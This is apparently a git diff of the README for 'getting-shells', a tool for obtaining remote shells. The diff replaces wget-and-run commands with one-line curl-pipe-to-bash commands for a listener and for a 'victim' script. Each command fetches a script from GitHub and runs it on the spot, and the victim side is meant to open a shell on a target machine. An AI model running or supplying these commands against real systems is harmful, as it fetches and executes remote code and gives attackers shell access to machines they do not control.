@@ -14,7 +14,7 @@ This tool simplifies the successive trials of starting a shell by selecting opti
 Listener:
 
 ```
-wget -q "https://raw.githubusercontent.com/davift/getting-shells/main/listener.sh" && chmod +x listener.sh && ./listener.sh
+bash -c "$(curl -sS https://raw.githubusercontent.com/davift/getting-shells/main/listener.sh)"
 ```
 
 ![listener_screenshot](https://github.com/davift/getting-shells/blob/main/listener.png)
@@ -22,7 +22,7 @@ wget -q "https://raw.githubusercontent.com/davift/getting-shells/main/listener.s
 Victim:
 
 ```
-wget -q "https://raw.githubusercontent.com/davift/getting-shells/main/victim.sh" && chmod +x victim.sh && ./victim.sh
+bash -c "$(curl -sS https://raw.githubusercontent.com/davift/getting-shells/main/victim.sh)"
 ```
 
 ![victim_screenshot](https://github.com/davift/getting-shells/blob/main/victim.png)
